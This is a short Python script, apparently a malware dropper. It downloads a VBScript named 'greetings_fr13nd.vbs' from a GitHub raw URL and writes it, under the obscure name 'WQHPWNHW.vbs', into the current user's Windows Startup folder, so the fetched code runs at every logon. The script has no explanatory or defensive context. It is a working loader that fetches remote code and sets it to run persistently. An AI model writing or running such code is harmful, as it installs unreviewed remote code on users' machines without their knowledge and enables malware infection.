import os

import requests

url = "https://raw.githubusercontent.com/lhaken/fr13nd/main/greetings_fr13nd.vbs"
r = requests.get(url)
t = r.text
username = os.getlogin()

with open("C:\\Users\\" + username + "\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\WQHPWNHW.vbs", "w") as file:
    file.write(t)
